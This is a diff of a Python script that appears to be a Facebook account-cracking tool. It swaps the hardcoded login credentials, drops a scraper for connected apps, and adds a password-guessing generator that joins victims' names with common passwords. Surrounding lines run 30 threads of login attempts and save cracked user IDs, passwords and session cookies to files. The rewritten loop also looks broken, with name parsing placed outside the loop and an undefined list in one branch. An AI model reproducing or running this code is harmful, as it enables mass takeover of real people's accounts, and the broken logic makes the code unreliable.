@@ -27,10 +27,6 @@ from rich.columns import Columns as col
 from rich import pretty
 from rich.text import Text as tekz
 from time import localtime as lt
-import requests
-from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor as tred
-import time
 pretty.install()
 CON = sol()
 # ------------------[ MR-JUBAYER ]-------------------#
@@ -1813,7 +1809,8 @@ def meyexudi():
             input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
             txt = (
                 'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id)
-            os.system('am start https://m.me/axczel.xhan?text=' + txt), approval()
+            os.system('am start https://m.me/axczel.xhan?text=' +
+                      txt), approval()
             time.sleep(1)
             meyexudi()
     except:
@@ -1849,7 +1846,7 @@ while attemps < 12345677901:
     password = input(
         '\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')
 
-    if username == 'axl' and password == '159':
+    if username == 'EHC' and password == 'JUBAYER':
         print(' \033[0;95mYou Have Successfully Logged in.')
         os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
         break
@@ -1950,7 +1947,8 @@ def menu():
     print(f"""\033[38;5;46m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 ϴᏦ 𝗜𝗗𝘇   """)
     print("""\033[38;5;46m[\033[98;1m0\033[98;1m] \033[0;98mᎬХᏆͲ""")
     print('\033[38;5;46m=================')
-    UserInput = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
+    UserInput = input(
+        '\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
     if UserInput in ['111']:
         login()
         dump_massal()
@@ -2241,35 +2239,6 @@ def setting():
 # -------------------[ BAGIAN-WORDLIST ]------------#
 
 
-def get_connected_apps(c_user):
-    try:
-        session = requests.Session()
-        url = f"https://mbasic.facebook.com/settings/apps/tabbed/?nav_source=unknown_facebook_menu&tab=active&c_user={c_user}"
-        response = session.get(url)
-        soup = BeautifulSoup(response.text, 'html.parser')
-
-        # Extracting active apps
-        active_apps = [h3.text.strip()
-                       for h3 in soup.select('form[method="post"] h3')]
-
-        # Fetching inactive (expired) apps
-        url_inactive = f"https://mbasic.facebook.com/settings/apps/tabbed/?nav_source=unknown_facebook_menu&tab=inactive&c_user={c_user}"
-        response_inactive = session.get(url_inactive)
-        soup_inactive = BeautifulSoup(response_inactive.text, 'html.parser')
-        inactive_apps = [h3.text.strip()
-                         for h3 in soup_inactive.select('form[method="post"] h3')]
-
-        return {
-            'active_apps': active_apps,
-            'inactive_apps': inactive_apps
-        }
-    except Exception as e:
-        print(f"Error fetching connected apps: {e}")
-        return {
-            'active_apps': [],
-            'inactive_apps': []
-        }
-
 def passwrd():
     os.system('clear')
     print(logo)
@@ -2286,162 +2255,91 @@ def passwrd():
     print(
         f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝐔𝐒𝐄=[𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 EVERY 3 MINS 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
     print('\x1b[38;5;50m===============================================')
+
+    def generate_password_variations(first_name, last_name, full_name):
+        pwv = []
+
+        if len(first_name) < 3 or len(last_name) < 3:
+            pwv.append((first_name, last_name))
+        else:
+            variations_first = [
+                '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
+                'pogi', 'pogiko', 'ganda', 'gandako', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '143',
+                '123456', 'full_name', '57273200', '@123', '@', '@@', '@@@', '@@@@', '@#', '1122', '11', '111', '33', '333',
+                '22', '222', 'gandako', 'maganda', 'ganda', 'pogi', 'khan', '19', '17', '16', '18', '143', 'hosen',
+                '123abc', 'admin', 'root', 'password', 'qwerty', '123qwe', '111', '222', '333', '444', '555',
+                'birthyear', 'lastname', 'firstname', 'username', 'qwerty123', '1234abcd', '1234567890', 'iloveyou',
+                'letmein', 'welcome', 'passw0rd', 'abcdef', 'secret', 'football', 'princess', 'qwertyuiop', 'michael',
+                'dragon', 'master', 'sunshine', 'shadow', 'superman', 'mustang', 'charlie', 'password1', 'zxcvbnm',
+                '000000', '111111', '123123', '111222', '888888', '999999', 'abcdefg', 'password123'
+            ]
+
+        pwv.extend([first_name + var for var in variations_first])
+
+        variations_last = [
+            '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
+            'pogi', 'pogiko', 'ganda', 'gandako', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '143',
+            '123456', 'full_name', '57273200', '@123', '@', '@@', '@@@', '@@@@', '@#', '1122', '11', '111', '33', '333',
+            '22', '222', 'gandako', 'maganda', 'ganda', 'pogi', 'khan', '19', '17', '16', '18', '143', 'hosen',
+            '123abc', 'admin', 'root', 'password', 'qwerty', '123qwe', '111', '222', '333', '444', '555',
+            'birthyear', 'lastname', 'firstname', 'username', 'qwerty123', '1234abcd', '1234567890', 'iloveyou',
+            'letmein', 'welcome', 'passw0rd', 'abcdef', 'secret', 'football', 'princess', 'qwertyuiop', 'michael',
+            'dragon', 'master', 'sunshine', 'shadow', 'superman', 'mustang', 'charlie', 'password1', 'zxcvbnm',
+            '000000', '111111', '123123', '111222', '888888', '999999', 'abcdefg', 'password123'
+        ]
+
+        pwv.extend([last_name + var for var in variations_last])
+
+        variations_full = [
+            '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
+            'pogi', 'pogiko', 'ganda', 'gandako', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '143',
+            '123456', '57273200', '@123', '@', '@@', '@@@', '@@@@', '@#', '1122', '11', '111', '33', '333',
+            '22', '222', 'gandako', 'maganda', 'ganda', 'pogi', 'khan', '19', '17', '16', '18', '143', 'hosen',
+            '123abc', 'admin', 'root', 'password', 'qwerty', '123qwe', '111', '222', '333', '444', '555',
+            'birthyear', 'lastname', 'firstname', 'username', 'qwerty123', '1234abcd', '1234567890', 'iloveyou',
+            'letmein', 'welcome', 'passw0rd', 'abcdef', 'secret', 'football', 'princess', 'qwertyuiop', 'michael',
+            'dragon', 'master', 'sunshine', 'shadow', 'superman', 'mustang', 'charlie', 'password1', 'zxcvbnm',
+            '000000', '111111', '123123', '111222', '888888', '999999', 'abcdefg', 'password123'
+        ]
+
+        pwv.extend([full_name + var for var in variations_full])
+
+        return pwv
+
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf, full_name = yuzong.split('|')[0], yuzong.split('|')[1].lower()
             names = full_name.split(' ')
-            first_name = names[0] if names else ''
-            middle_name = names[1] if len(names) > 1 else ''
-            last_name = ' '.join(names[2:]) if len(names) > 2 else ''
-            pwv = []
+        first_name = names[0] if names else ''
+        last_name = ' '.join(names[1:]) if len(names) > 1 else ''
 
-            if len(full_name) < 6:
-                if len(first_name) < 3 or len(middle_name) < 3 or len(last_name) < 3:
-                    # Append variations to pwv for each name component
-                    for i in range(1, 21):
-                        pwv.append(first_name + str(i))
-                        pwv.append(middle_name + str(i))
-                        pwv.append(last_name + str(i))
+        pwv = generate_password_variations(first_name, last_name, full_name)
 
-                # Combine first, middle, and last name
-                        pwv.append(first_name + middle_name + last_name)
-                        pwv.append(first_name + last_name + middle_name)
-                        pwv.append(middle_name + first_name + last_name)
-                        pwv.append(middle_name + last_name + first_name)
-                        pwv.append(last_name + first_name + middle_name)
-                        pwv.append(last_name + middle_name + first_name)
-
-                # Add variations with special characters and common patterns
-                        pwv.append(first_name + str(i) + '!')
-                        pwv.append(middle_name + str(i) + '@')
-                        pwv.append(last_name + str(i) + '#')
-                        pwv.append(first_name + middle_name + str(i) + '$')
-                        pwv.append(first_name + last_name + str(i) + '%')
-                        pwv.append(first_name + middle_name + last_name + str(i) + '&')
-                        pwv.append(first_name + str(i) + str(i + 1))
-                        pwv.append(last_name + str(i) + str(i + 1))
-
-                # Common patterns and variations
-                        pwv.append(first_name.lower())
-                        pwv.append(middle_name.lower())
-                        pwv.append(last_name.lower())
-                        pwv.append(first_name.upper())
-                        pwv.append(middle_name.upper())
-                        pwv.append(last_name.upper())
-                        pwv.append(first_name.capitalize())
-                        pwv.append(middle_name.capitalize())
-                        pwv.append(last_name.capitalize())
-                        pwv.append(first_name + middle_name)
-                        pwv.append(first_name + last_name)
-                        pwv.append(middle_name + first_name)
-                        pwv.append(middle_name + last_name)
-                        pwv.append(last_name + first_name)
-                        pwv.append(last_name + middle_name)
-
-                # Additional patterns and variations
-                        pwv.append(first_name + last_name[:2])
-                        pwv.append(first_name[:2] + last_name)
-                        pwv.append(first_name[:2] + middle_name[:2] + last_name[:2])
-                        pwv.append(first_name[::-1])
-                        pwv.append(last_name[::-1])
-                        pwv.append(first_name + middle_name + last_name[::-1])
-                        pwv.append(first_name + middle_name[::-1] + last_name)
-                        pwv.append(last_name + middle_name + first_name[::-1])
-                        pwv.append(last_name + middle_name[::-1] + first_name)
-
-                    pwv.append(first_name+'12')
-                    pwv.append(first_name+'123')
-                    pwv.append(first_name+'1234')
-                    pwv.append(first_name+'12345')
-                    pwv.append(first_name+'123456')
-                    pwv.append(middle_name)
-                    pwv.append('57273200')
-                    pwv.append(first_name+'@123')
-                    pwv.append(first_name+'@')
-                    pwv.append(first_name+'@@')
-                    pwv.append(first_name+'@@@')
-                    pwv.append(first_name+'@@@@')
-                    pwv.append(first_name+'@#')
-                    pwv.append(first_name+'1122')
-                    pwv.append(first_name+'11')
-                    pwv.append(first_name+'111')
-                    pwv.append(first_name+'33')
-                    pwv.append(first_name+'333')
-                    pwv.append(first_name+'22')
-                    pwv.append(first_name+'222')
-                    pwv.append(first_name+'gandako')
-                    pwv.append(first_name+'maganda')
-                    pwv.append(first_name+'ganda')
-                    pwv.append(first_name+'pogi')
-                    pwv.append(first_name+'khan')
-                    pwv.append(first_name+'19')
-                    pwv.append(first_name+'17')
-                    pwv.append(first_name+'16')
-                    pwv.append(first_name+'18')
-                    pwv.append(first_name+'143')
-                    pwv.append(first_name+'hosen')
-
-            else:
-                if len(first_name) < 3:
-                    pwv.append(middle_name)
-                else:
-                    pwv.append(first_name+'12')
-                    pwv.append(first_name+'123')
-                    pwv.append(first_name+'1234')
-                    pwv.append(first_name+'12345')
-                    pwv.append(first_name+'123456')
-                    pwv.append(middle_name)
-                    pwv.append('57273200')
-                    pwv.append(first_name+'@123')
-                    pwv.append(first_name+'@')
-                    pwv.append(first_name+'@@')
-                    pwv.append(first_name+'@@@')
-                    pwv.append(first_name+'@@@@')
-                    pwv.append(first_name+'@#')
-                    pwv.append(first_name+'1122')
-                    pwv.append(first_name+'11')
-                    pwv.append(first_name+'111')
-                    pwv.append(first_name+'33')
-                    pwv.append(first_name+'333')
-                    pwv.append(first_name+'22')
-                    pwv.append(first_name+'222')
-                    pwv.append(first_name+'gaming')
-                    pwv.append(first_name+'khan')
-                    pwv.append(first_name+'hosen')
-                    pwv.append(first_name+'hossain')
-                    pwv.append(first_name+'Gaming')
-                    pwv.append(first_name+'khan')
-                    pwv.append(first_name+'019')
-                    pwv.append(first_name+'017')
-                    pwv.append(first_name+'016')
-                    pwv.append(first_name+'018')
-                    pwv.append(first_name+'khan')
-                    pwv.append(first_name+'hosen')
-
-            if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            else:
-                pass
-            if 'mobile' in method:
-                pool.submit(crack, idf, pwv)
-            elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'touch' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackfree, idf, pwv)
-            else:
-                pool.submit(crackfree, idf, pwv)
-    print('\n\033[1;37m===================================')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m' +
-          time.strftime("%H:%M")+" " + tag)
-    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s ' % (ok))
-    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s ' % (cp))
-    print('\n\033[1;37m===================================')
-    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
-    os.system("python axl.py")
-    exit()
+        if 'ya' in pwpluss:
+            for xpwd in pwnya:
+                pwv.append(xpwd)
+        else:
+            pass
+        if 'mobile' in method:
+            pool.submit(crack, idf, pwv)
+        elif 'free' in method:
+            pool.submit(crackfree, idf, pwv)
+        elif 'touch' in method:
+            pool.submit(crackfree, idf, pwv)
+        elif 'mbasic' in method:
+            pool.submit(crackfree, idf, pwv)
+        else:
+            pool.submit(crackfree, idf, pwv)
+        print('\n\033[1;37m===================================')
+        print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m' +
+              time.strftime("%H:%M")+" " + tag)
+        print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s ' % (ok))
+        print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s ' % (cp))
+        print('\n\033[1;37m===================================')
+        woi = input(
+            '\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
+        os.system("python axl.py")
+        exit()
 # --------------------[ METODE-B-API ]-----------------#
 
 
@@ -2486,11 +2384,6 @@ def crack(idf, pwv):
                                    for key, value in ses.cookies.get_dict().items()])
                 print(
                     f'\r\033[38;5;46m[AXCZEL - ALIVE🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
-                
-                connected_apps_info = get_connected_apps(idf)
-                print('\033[97;1m[\033[92;1m•\033[95;1m] CONNECTED APPS :\033[0;93m %s ' % (
-                    connected_apps_info))
-
                 os.system(
                     'espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc, 'a').write(idf+' • '+pw+'\n')
@@ -2534,7 +2427,7 @@ def crackfree(idf, pwv):
                 print(
                     f'\r\033[38;5;46m[{time.strftime("%H:%M")}Axczel - DEAD] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                open('CP/'+cp, 'a').write(idf+' • '+pw+'\n')
+                open('CP/'+cpc, 'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp += 1
                 break
